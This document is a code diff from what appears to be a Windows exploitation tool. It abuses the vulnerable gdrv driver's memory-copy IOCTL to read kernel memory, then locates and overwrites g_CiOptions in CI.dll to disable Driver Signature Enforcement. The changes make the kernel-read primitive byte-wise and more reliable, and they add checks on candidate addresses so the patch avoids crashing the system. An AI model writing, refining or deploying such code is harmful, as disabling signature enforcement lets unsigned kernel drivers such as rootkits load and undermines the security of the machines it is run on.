@@ -316,20 +316,20 @@ static BOOL gdrv_read(UINT64 kva, DWORD sz, UINT64 *out) {
     *out = 0;
     if(g_hDev == INVALID_HANDLE_VALUE) return FALSE;
     DWORD br;
-    /* Step 1: copy target KVA → KSHARED scratch (kernel→kernel, SMAP-safe) */
-    GIO_MEMCPY_IN req = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)kva, sz};
-    if(!DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL)) {
-        logf("[!] gdrv kread IOCTL err=%lu", GetLastError()); return FALSE;
-    }
-    /* Step 2: read back from user-mode view of the same physical page */
-    volatile PBYTE u = (volatile PBYTE)(ULONG_PTR)(KSHARED_UVA + SCRATCH_OFF);
-    for(DWORD i = 0; i < sz && i < 8; i++) *out |= ((UINT64)u[i]) << (i * 8);
-    /* Step 3: restore scratch to 0, one byte at a time.
-       Using sz>1 with ntoskrnl+3 as src copied ntoskrnl bytes 3..3+sz into KSHARED,
-       which are NOT all zero and could corrupt adjacent KUSER_SHARED_DATA fields. */
+    /* Read strictly one byte at a time: copy kva+i → KSHARED+SCRATCH_OFF (1 byte),
+       read back via user-mode alias, restore to 0 immediately.
+       This keeps all operations to the single byte at SCRATCH_OFF (Reserved12[0])
+       and avoids touching adjacent KUSER_SHARED_DATA fields at 0x2EF+. */
     UINT64 zero_src = g_ntoskrnl_kva + 3; /* offset 3 in ntoskrnl DOS stub is always 0x00 */
-    for(DWORD i = 0; i < sz; i++) {
-        GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF + i), (ULONG_PTR)zero_src, 1};
+    volatile PBYTE u = (volatile PBYTE)(ULONG_PTR)(KSHARED_UVA + SCRATCH_OFF);
+    for(DWORD i = 0; i < sz && i < 8; i++) {
+        GIO_MEMCPY_IN req = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)(kva + i), 1};
+        if(!DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL)) {
+            logf("[!] gdrv kread IOCTL err=%lu", GetLastError()); return FALSE;
+        }
+        *out |= ((UINT64)(*u)) << (i * 8);
+        /* Restore scratch byte to 0 before next iteration */
+        GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)zero_src, 1};
         DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req2, sizeof(req2), NULL, 0, &br, NULL);
     }
     return TRUE;
@@ -1365,13 +1365,13 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
     /* Primary: precise pattern scan — no kernel read, SMAP-safe */
     UINT64 kva = find_ci_options_precise(ci_base);
 
-    /* For physical backends, verify the precise result before trusting it.
-       Three-layer check: alignment + CI.dll bounds, then DWORD read (far more
-       discriminating than 1-byte — g_CiOptions is a DWORD whose upper 3 bytes are
-       always 0x00 in production CI.dll, so valid DWORD is 0-63), then a stability
-       re-read after 15 ms (static globals are stable; stack/pool memory changes).
-       gdrv SMAP makes kread unreliable so skip verification there. */
-    if (kva && g_backend != BE_GDRV) {
+    /* Verify the precise result before trusting it (all backends including gdrv).
+       gdrv_read now reads byte-by-byte through KSHARED+0x2EE only, which is
+       SMAP-safe and reliable.  Three-layer check:
+       1) alignment + CI.dll VA bounds
+       2) DWORD read — g_CiOptions upper 3 bytes always 0x00, value 0..63
+       3) stability re-read after 15 ms — static globals don't change */
+    if (kva) {
         /* Layer 1: alignment + bounds */
         if ((kva & 3) || kva < ci_base || kva >= ci_base + (UINT64)vsz) {
             logf("[!] precise: kva=0x%016llX misaligned or outside CI.dll — discarding",
@@ -1401,15 +1401,11 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
         }
     }
 
-    /* Fallback: AOB scan.
-     * For physical backends (LNV/TS): kread is reliable — verify the candidate holds
-     * the expected g_CiOptions value (0x06 = DSE enabled) before writing.
-     * For gdrv (SMAP makes kread unreliable): use first writable-section candidate only.
-     * This prevents writing to a wrong address and causing KMODE_EXCEPTION_NOT_HANDLED. */
+    /* Fallback: AOB scan — verify every candidate on all backends. */
     if(!kva) {
         UINT64 cands[MAX_CAND]; ULONG n=scan_ci_options(ci_base,vsz,cands,MAX_CAND);
         if(n) {
-            if(g_backend!=BE_GDRV) {
+            {
                 for(ULONG ci=0; ci<n && !kva; ci++) {
                     /* Alignment + bounds guard first */
                     if ((cands[ci] & 3) || cands[ci] < ci_base || cands[ci] >= ci_base+(UINT64)vsz) {
@@ -1435,9 +1431,6 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
                     logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable — verified",
                          (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
                 }
-            } else {
-                kva=cands[0];
-                logf("[*] precise failed, gdrv fallback cand[0]=0x%016llX",(unsigned long long)kva);
             }
         }
     }
@@ -1450,8 +1443,9 @@ static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
     Sleep(50);
     if(!is_dse_disabled()){logf("[!] Failed to patch g_CiOptions.");return FALSE;}
 
-    *out_kva=kva; *out_orig=0x06; /* assume default; can't kread reliably */
-    logf("[+] DSE DISABLED");return TRUE;
+    *out_kva=kva; *out_orig=0x06;
+    logf("[+] DSE DISABLED");
+    return TRUE;
 }
 
 static void restore_dse(UINT64 kva,UINT64 orig) {
